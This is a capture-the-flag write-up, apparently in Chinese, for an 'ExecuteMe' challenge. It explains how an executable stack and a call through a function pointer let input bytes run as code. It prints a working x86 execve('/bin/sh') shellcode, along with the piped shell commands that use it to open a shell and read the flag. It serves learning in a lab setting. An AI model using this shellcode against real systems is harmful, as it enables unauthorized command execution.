# ExecuteMe
 * [Makefile](Makefile)中，`-zexestack`把原本預設的`stack as non-executable``拿掉了，能在stack上執行任何code
 * [程式碼](execute.c) function_ptr
```c
typedef void (*function_ptr)();
...
((function_ptr)buf)();
```
 * function pointer？
  * 每個function包含code和指到code的function pointer
  * code必須是**可執行的assembly code**
 * 而buf在傳給function_ptr前，會先經過：`read(0, buf, 128);`
 * 因此，我們要創造的code，**不能包含\x0**，否則copy function會當作結束字元
 * server是x86
```
$ readelf -h execute
...
Class:    ELF32
Data:     2's complement, little-endia
...
OS/ABI:   UNIX - System V
...
Machine:    Intel 80386
```

## Solve
想自己寫一個但還沒成功，所以先用[網路上其他人做的x86 execve("/bin/sh")](https://www.exploit-db.com/exploits/37069/)：
`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80`
 * 放入程式執行
```bash
pico62895@shell:/home/execute$ (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"') | ./execute
pico62895@shell:/home/execute$
```
 成功執行，但在我們能輸入其他指令前就結束了
 * 使用cat讓他開著，並且會把結果印到terminal上：
```bash
pico62895@shell:/home/execute$ (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"'; cat) | ./execute
ls
Makefile   core       execute	 execute.c  flag.txt
cat flag.txt
shellcode_is_kinda_cool
```
